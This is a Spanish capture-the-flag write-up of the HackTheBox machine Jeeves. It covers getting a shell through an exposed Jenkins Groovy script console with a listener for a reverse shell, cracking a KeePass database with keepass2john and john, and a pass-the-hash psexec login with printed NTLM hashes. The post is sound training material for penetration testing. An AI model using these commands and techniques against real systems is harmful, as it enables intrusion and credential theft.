---
layout      : post
title       : "HackTheBox - Jeeves"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114banner.png
category    : [ htb ]
tags        : [ ADS, jenkins, .kdbx, groovy, askjeeves, kpcli ]
---
M√°quina Windows nivel medio. La elegancia de **Jenkins** que nos permite jugar con scripts de **Groovy** para obtener **RCE** :O Archivos **.kdbx** con contrase√±as dentro (¬øqu√© puede pasar?) y descubriremos objetos ocultos mediante los **Alternate Data Stream** (**ADS**).

![114jeevesHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114jeevesHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [mrb3n](https://www.hackthebox.eu/profile/2984).

Vamos a estar muy elegantes.

Empezaremos con un servidor web algo pregunt√≥n, nos moveremos a otro m√°s calmadito con el que fuzzearemos directorios para encontrar recursos fuera de nuestra vista. Llegaremos a un servidor `Jenkins` bastaaaaante interesante. Usaremos su consola de scripts para ejecutar c√≥digo -interesante- del lenguaje de programaci√≥n `Groovy`. Finalmente obtendremos una **Reverse Shell** como el usuario `kohsuke`.

Estando en el sistema encontraremos un archivo `.kdbx` (**KeePass Database**) que contiene tooooooodas las contrase√±as guardadas por **kohsuke**, pero para poder verlas necesitamos una contrase√±a -maestra-, jugaremos con `keepass2john` y `john` para crackear la credencial maestra, esto para obtener acceso completo a la base de datos con la herramienta `kpcli`.

Una de las contrase√±as contiene un backup de unos hashes al dumpear la `SAM`, con ayuda de `psexec` lograremos probarlos contra el usuario `Administrator` y obtener una **terminal** en el sistema como el usuario `nt authority\system`.

Y tendremos que hacer un peque√±o movimiento con los `Alternate Data Stream` para encontrar la flag `root.txt` oculta en un archivo.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Algunas vulns conocidas y cositas reales.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.

...

En las noches fr√≠as.

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Recorremos el puerto 80](#puerto-80).
  * [Recorremos el puerto 50000](#puerto-50000).
  * [Encontramos servidor **Jenkins** en el puerto **50000**](#web-jenkins-found).
3. [Explotaci√≥n](#explotacion).
  * [Usamos instrucciones del lenguaje **Groovy** para ejecutar comandos en el sistema](#jenkins-groovy-scripts).
  * [Intentamos desencriptar los secretos de **Jenkins**](#decrypt-jenkins-secrets).
4. [Escalada de privilegios](#escalada-de-privilegios).
  * [Jugamos con el archivo **KeePass** y obtenemos **master password** de la base de datos](#keepass2john).
  * [Vemos credenciales del gestor **KeePass**](#keepass-cracked).
  * [Usamos **psexec** para obtener una **terminal** usando **hashes almacenados en la <u>.kdbx</u>](#psexec).
5. [Vemos que la flag esta oculta con un **Alternate Data Stream**](#ads).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Empezaremos viendo que puertos tiene abiertos la m√°quina, as√≠ vamos direccionando nuestro research, usaremos `nmap`:

```bash
‚ù± nmap -p- --open -v 10.10.10.63 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

El escaneo nos devuelve:

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.63
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.63 ()	Status: Up
Host: 10.10.10.63 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 50000/open/tcp//ibm-db2///	Ignored State: filtered (65531)
# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 204.57 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 80      | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos ofrece un servidor web. |
| 135/445 | **[SMB](https://ayudaleyprotecciondatos.es/2021/03/04/protocolo-smb/)**: Protocolo para compartir informaci√≥n entre dispositivos de una red. |
| 50000   | ibm-db2: No sabemos a√∫n que esta sirviendo el puerto en concreto. |

Bien, ahora que sabemos que puertos hay, vamos a profundizar un poco m√°s y descubrir que scripts y versiones est√°n siendo mantenid@s por cada servicio:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.63
    [*] Open ports: 80,135,445,50000

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 80,135,445,50000 -sC -sV 10.10.10.63 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y este escaneo nos muestra:

```bash
‚ù± cat portScan
# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p 80,135,445,50000 -sC -sV -oN portScan 10.10.10.63
Nmap scan report for 10.10.10.63
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h05m37s, deviation: 0s, median: 5h05m36s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-17T21:40:02
|_  start_date: 2021-08-17T21:30:10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 48.15 seconds
```

Cositas relevantes:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 80     | HTTP     | 

* Vemos `Ask Jeeves`, es curioso, pero no tenemos a√∫n certeza de que es.

---

| Puerto | Servicio | Versi√≥n |
| 50000  | HTTP     | Jetty 9.4.z-SNAPSHOT |

Esa versi√≥n suena locochona, teng√°mosla en cuenta para m√°s adelante, por ahora no vemos nada m√°s, sigamos.

...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [üìå](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lindo, encontramos el logo del famoso [Ask](https://es.wikipedia.org/wiki/Ask.com) (que su nombre original es `Ask Jeeves`), encargado de hacer b√∫squedas en internet (es como un **Google**), as√≠ que contamos con un motor de b√∫squeda como primera medida.

Existe un campo en el que podemos escribir cositas para ser buscadas, pero con cualquier t√©rmino nos redirige al recurso `error.html`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_SourceHTML_link2errorHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y ese recurso tiene esta imagen:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_SourceHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_jeevesPNG.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

De ella podemos destacar varias cositas:

* `Microsoft SQL Server 2005 - 9.00.4053`.
* Una ruta de los archivos de la web: `c:\webroot\Sock_Puppets\...`.
* Y al final unas versiones, tanto de `.NET` como de `ASP.NET`.

No sabemos si esto nos sirva de algo (por la fecha que tiene el error) pero podemos guardarlo (:

---

## Puerto 50000 [üìå](#puerto-50000) {#puerto-50000}

Revisando el servicio del puerto `50000` encontramos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Volvemos a ver la referencia hacia `Jetty 9.4.z-SNAPSHOT`, as√≠ que busquemos de que trata...

üöèüöèüöè ***`Jetty` es un servidor web y contenedor de <u>Servlets</u> (clases que ayudan a ampliar las capacidades de un servidor) que se enfoca <u>100%</u> en `Java`.***

Bien, buscando vulnerabilidades relacionadas con la versi√≥n `9.4.z-SNAPSHOT` o `9.4` caemos en este post:

* [Critical Jenkins Server Vulnerability - (CVE-2019-17638)](https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638).

üöÄ ***"Jenkins, the open-source automation server software, had a critical vulnerability (CVE-2019-17638) in the `Jetty` web server that allowed the leakage of users confidential data.***" [davosnetworks](https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638).

OJOOOOooklajsdl√±f ¬øqu√© es Jenkins? ¬ø? ¬ø? r√°pidamenteeeeeee...

La idea de **Jenkins** es supervisar tooooooodas las tareas repetitivas que se realizan en un proyecto, peeeeeero lo hace √©l, eso evita a los programadores estar revisando y revisando problemas o temas relacionados con el c√≥digo. Su definici√≥n es sencilla: ***servidor automatizado de integraci√≥n continua***.

Les dejo este excelente post donde se habla de que es **Jenkins** y **la integraci√≥n continua**:

* [¬øQu√© es Jenkins?, Herramienta de Integraci√≥n Continua](https://ciberninjas.com/jenkins/).

Bien, peeeeeeeeeeeeeeero no podemos hacer nada con esa vulnerabilidad que encontramos, ya que tenemos el servidor **Jetty** pero no el servidor **Jenkins**.

...

## Encontramos servidor <u>Jenkins</u> en el puerto <u>50000</u> [üìå](#web-jenkins-found) {#web-jenkins-found}

Despu√©s de estar probando cositas, encontramos algo llamativo al fuzzear directorios que la web sostiene, pero fuera de nuestra vista.

Usaremos `wfuzz` pas√°ndole 20 hilos, el wordlist que usara y en que parte la **URL** queremos que pruebe cada l√≠nea:

```bash
‚ù± wfuzz -c --hc=404 -t 20 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                        
=====================================================================

000041607:   302        0 L      0 W        0 Ch        "askjeeves"
...
```

S√∫per leeeeeeejos (el archivo tiene m√°s de 200k l√≠neas) encontr√≥ un recurso llamado `askjeeves` (que se relaciona con nuestro servicio en el puerto **80**), es un redirect, pero ve√°moslo a ver a donde nos lleva:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pos si, tamos en la interfaz del servidor `Jenkins`, lo primero llamativo a la vista fue la versi√≥n que esta abajo a la derecha: `Jenkins 2.87`, esto nos abre una nueva puerta para buscar vulns.

...

# Explotaci√≥n [#](#explotacion) {#explotacion}

Indagando un poco en las opciones que nos brinda el servidor, vemos en la parte izquierda una tuerca y el texto `Manage Jenkins`, si damos clic recibimos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hay varios apartados interesantes, pero de toooooooooodos hay dos muuuuy llamativos: `System Information` (info del entorno donde esta montado **Jenkins**) y `Script Console` (permite ejecutar scripts).

üöÜ **System Information**:

Uff bastantes cositas... Pero lo m√°s relevante ser√≠a esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_systemInfo.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos dos usuarios del sistema y vemos la ruta donde esta el ejecutable de `Jenkins` (que esta en una de las carpetas del usuario **Administrator**).

üöÜ **Script Console**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

√âl mismo nos informa que podemos escribir ah√≠:

> Type in an **arbitrary `Groovy script` and execute it** on the server.

---

## Jugamos con scripts de <u>Groovy</u> para ejecutar comandos en el sistema [üìå](#jenkins-groovy-scripts) {#jenkins-groovy-scripts}

‚õ∞Ô∏è ***Groovy es un lenguaje de programaci√≥n orientado a objetos implementado sobre la plataforma Java. Groovy usa una sintaxis muy parecida a Java, comparte el mismo modelo de objetos, de hilos y de seguridad.*** [Wikipedia](https://es.wikipedia.org/wiki/Groovy_(lenguaje_de_programaci%C3%B3n)).

Buscando como usar la consola o ejemplos del lenguaje `Groovy`, encontramos este recurso:

* [Exploiting Jenkins Groovy Script Console in Multiple Ways](https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/).

El post nos provee directamente un payload para obtener una **Reverse Shell**, lo extrae de este otro recurso:

* [https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Antes de intentarlo quer√≠a mostrarles este otro c√≥digo, con √©l podemos ejecutar comandos en el sistema y ver su respuesta:

* [https://gist.github.com/katta/5465317](https://gist.github.com/katta/5465317).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyCommands.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Prob√©moslo pero con el comando `whoami` a vel:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_RCE_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Liiiistooones, el usuario que esta ejecutando el servicio **Jenkins** se llama `kohsuke` yyyy ya tendr√≠amos ejecuci√≥n remota de comandos (:

Ese ejemplo me gusto porque es muy sencillo de interpretar. Ahora si intentemos generar la **Reverse Shell**.

Nos ponemos en escucha por el puerto en el que queremos recibirla, en mi caso en el `4433`:

```bash
‚ù± nc -lvp 4433
```

Y ahora en la consola de scripts ejecutar√≠amos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_tryingRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Le indicamos que nos env√≠e una petici√≥n hacia nuestro puerto `4433` y que cuando la establezca nos ejecute una `cmd.exe` (terminal).

Damos clic en `Run` yyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO!! Conseguimos la reverse **Shell** como el usuario `kohsuke` y estamos en el sistema (:

...

Con este script logramos una Shell en la misma ejecuci√≥n del programa:

> [jenkins_pwn_shell.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/jeeves/jenkins_pwn_shell.py)

---

## Intentamos desencriptar los secretos de <u>Jenkins</u> [üìå](#decrypt-jenkins-secrets) {#decrypt-jenkins-secrets}

Nuestra primera impresi√≥n al ejecutar `dir` es ver muuuuuuuucho archivos, uno con un nombre llamativo (`secret.key`) que me hizo volver a un recurso que hab√≠a desechado:

* [https://github.com/gquere/pwn_jenkins](https://github.com/gquere/pwn_jenkins#files-to-copy-after-compromission).

Habla de los ü§´ secretos de **Jenkins** üò∂ y lo necesario para desencriptarlos, que serian dos archivos:

* `secrets/master.key`.
* `secrets/hudson.util.Secret`.

Peeero si bajamos un poquito m√°s [vemos que podemos intentar desencriptarlos](https://github.com/gquere/pwn_jenkins#decrypt-jenkins-secrets-from-groovy) con el propio `Groovy` y sus comandos, pues aprovechemos la consola que tenemos para interactuar con eso...

Simplemente debemos pasarle el secreto:

```groovy
println(hudson.util.Secret.decrypt("{...}"))
```

Leyendo [ac√°](https://gist.github.com/tuxfight3r/eca9442ff76649b057ab) entendemos el porqu√© hay unos `{}` en el ejemplo de arriba, ellos hacen parte del secreto, por lo que en caso de encontrar alg√∫n secreto para lograr desencriptarlo debemos agregar los `{}` tambi√©n...

Enumerando las carpetas vemos el archivo `config.xml` en la ruta `..\Administrator\.jenkins\\users\admin`; en su contenido hay un **token** entre `{}`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_adminConfigXML_token.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues probemos la dezencryptazhion:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_ApiToken_decrypt.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos devuelve un **hash** y ese ser√≠a la flag que va en `root.txt` (: Y iaaaaaaaaa, eso es todo por esta m√°quina, veamos la flag del `user.txt`:

E.E noup, ese **hash** debe ser el `token` del **API** en texto plano, pero ¬ønos sirve esto para algo? Por ahora no (no creo que sirva tampoco despu√©s), pero aprendimos e.e

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando las carpetas de `kohsuke` encontramos una base de datos de contrase√±as en `Documents`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeSH_dirDocuments.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Por si no conoces los archivos **.kdbx**:

üîê ***Un objeto con la extensi√≥n `.kdbx` es un archivo <u>KeePass Password Database</u>, la finalidad de estos archivos es almacenar y proteger un grupo de contrase√±as de manera segura. Para acceder a la base de datos se necesita una contrase√±a -madre- o -maestra- que es la encargada de securizar toooooodas las dem√°s contrase√±as.***

M√°s info **KeePass** y **.kdbx**:

* [KeePass](https://es.wikipedia.org/wiki/KeePass).
* [Opening KDBX Files](https://filext.com/file-extension/KDBX).

...

## Jugamos con el archivo <u>.kdbx</u> y obtenemos <u>master password</u> [üìå](#keepass2john) {#keepass2john}

Existe una herramienta llamada [kpcli](http://kpcli.sourceforge.net/) con la cual podemos jugar para interactuar con la base de datos, pero primero pas√©monos el archivo a nuestro sistema:

```powershell
c:\\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.14.2\smbFolder\CEH.kdbx
```

```bash
‚ù± file CEH.kdbx 
CEH.kdbx: Keepass password database 2.x KDBX
```

Esta este excelente tutorial del que nos guiaremos para leer la base de datos:

* [How To Use kpcli To Manage KeePass2 Password Files](https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server).

Ejecutamos la herramienta y le indicamos que vamos a usar el archivo `.kdbx`:

```bash
‚ù± kpcli 
```

```bash
kpcli:/> open CEH.kdbx 
Please provide the master password:
```

Jmmmm, lo que hab√≠amos dicho antes, por lo general es necesaria una password maestra... Al colocar cualquier cosa obtenemos:

> <span style="color: yellow;">Couldn't load the file CEH.kdbx: The database key appears invalid or else the database is corrupt.</span>

F, F, F...

Dando algunas vueltas encontramos este recurso:

* [Cracking KeePass Database](https://tzusec.com/tag/keepass2john/).

En √©l se usa la herramienta `keepass2john` la cual obtiene un hash que hace referencia a la **master password**, depende de que tan fuerte sea para evitar ser crackeada (:

As√≠√≠√≠√≠√≠√≠ que obtengamos el hash e intentemos crackearlo:

```bash
‚ù± keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

Peeerfecto, guard√©moslo en un archivo:

```bash
‚ù± keepass2john CEH.kdbx > CEH.txt
```

Y ahora simplemente se lo pasamos a `John The Ripper` (que es un **crack**eador de contrase√±as):

```bash
‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt CEH.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:01:09 DONE (2021-08-17 19:32) 0.01443g/s 793.5p/s 793.5c/s 793.5C/s moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

¬øKHE ZE BE POR AY? Tenemos la ***master password*** en texto planooooooooooooooooo. 

Pos volvamos a cargar la base de datos y le pasamos esa pw:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_openDB_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora s√≠√≠√≠√≠√≠√≠√≠√≠, pos retomemos el [tutorial de antes](https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server) y exploremos...

---

## Vemos credenciales del gestor <u>KeePass</u> [üìå](#keepass-cracked) {#keepass-cracked}

Como bien dice el post, la interacci√≥n es muy parecida a la de los comandos `*nix`, pero claramente no opera sobre el sistema sino sobre la estructura que tiene la base de datos:

```bash
kpcli:/> ls
=== Groups ===
CEH/
```

Existe un grupo (que ser√≠a un apartado para organizar las distintas contrase√±as), entremos en √©l:

```bash
kpcli:/> cd CEH/
kpcli:/CEH> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
```

Vemos tambi√©n algunos grupos, pero lo nuevo son las -entradas-, que serian las contrase√±as que hay guardadas.

Tenemos la descripci√≥n del usuario y el sitio al que pertenece esa credencial (hay dos bastante curiosas que hacen referencia a servicios locales (pero que no existen en el sistema :P)), por ejemplo si inspeccionamos la password del **banco de america** tendr√≠amos esta estructura:

> Podemos ya sea llamar el index de cada uno (0,1,2,3...) o su nombre (Bank of America, EC-Council...)

---

```bash
kpcli:/CEH> show 1
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_show1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La barra roja evita mostrar la contrase√±a a los ojitos, pero si copiamos el contenido y lo pegamos en cualquier otro sitio, vamos a ver la contrase√±a.

Despu√©s de jugar con todas las entradas obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_showALL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

---

## Obtenemos terminal usando <u>hashes</u> y <u>psexec.py</u> [üìå](#psexec) {#psexec}

Hay algunas contrase√±as mooooooy llamativas, pero lo que m√°s me llamo la atenci√≥n fue la contrase√±a del index `0`, me record√≥ a cuando se dumpea la [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) (archivo que contiene las contrase√±as de los usuarios del sistema), ya que tienen el mismo formato, adjunto prueba e.e

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_dumpSAM.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> Tomada de [packtpub - dumping-the-contents-of-the-sam-database](https://subscription.packtpub.com/book/networking-and-servers/9781788623179/5/ch05lvl1sec76/dumping-the-contents-of-the-sam-database).

Si nos fijamos es igualito, si a nuestra credencial le agregamos al inicio un nombre de usuario queda igual, as√≠ que pueda que tengamos un hash de la **SAM**.

Lo bueno de tener esto es que podemos usarlas como -contrase√±as- (:

Usemos `psexec` (herramienta para acceder remotamente a un host) para probar el ingreso con los hashes:

```bash
‚ù± psexec.py Jeeves/Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Le pasamos el hostname (`Jeeves`), el usuario (inicialmente probamos con `Administrator`) el host y finalmente los hashes, ejecutamos yyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_psexec_NTauthoritySYSTEM_SH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

LKA√ë√ë√ë√ë√ësdf√±l√±√ësjdflkasjdflkajsoiJAODIafjsid VAMOOOOOOOOOOO!! Tamos en el sistema como el usuario `nt authority\system`.

---

# Extraemos la flag <u>root.txt</u> de un <u>ADS</u> [üìå](#ads) {#ads}

Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirAdministratorDesktop.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_type_hmTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pos no, a√∫n no vamos a ver flags ¬Ø\\_(„ÉÑ)_/¬Ø, tenemos que buscar el objeto `root.txt`... 

Nos indica que -veamos profundamente-, jmmm.

Lo primero que se ocurri√≥ fue que podr√≠a estar oculto en alguna ruta del sistema pero neeeeeeelson:

```powershell
c:\>powershell -c Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force
```

Lo siguiente que iba a hacer era complicarme con ese `.lnk` extra√±o del directorio `Desktop`, peeeeeeeeero al momento pens√© en intentar buscar archivos ocultos pero dentro de los mismos archivos existentes :o lo tambi√©n llamado `Alternate Data Stream`, que seria ocultar informaci√≥n dentro de archivos.

Les dejo un art√≠culo que hice en su tiempo profundizando a tope en los **ADS**:

* [Ocultando data en archivos de Windows (con ADS)](https://lanzt.github.io/article/ads-windows).

Podemos probar inicialmente con `dir /r`:

üëÅÔ∏è‚Äçüó®Ô∏è ***Display alternate data streams of the file.*** [docs.microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir).

A veeeeeeeeeer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirR_ADSfound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OJOOOOO, existe un archivo oculto dentro de `hm.txt` llamado `root.txt`, o sea, la flag (: pues veamos su contenido:

Usaremos el comando `more` para revelar el contenido del **ADS**, de manera normal:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_moreNormal.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y ahora referenciando el **ADS**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ya tendr√≠amos las flags de la m√°quina (:

Y finaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaal :^D

...

Bonita m√°quina, primer acercamiento contra un servidor **Jenkins** y todas sus locuras. El tema de **KeePass** me gusto bastante tambi√©n. El **ADS** no me exploto la cabeza porque ya los conoc√≠a, pero son muy lindos jajaj.

Meno, nos leeremos otro d√≠a, que est√©s bien y como siempre, a seguir rompiendo de tooooooooooooodo!!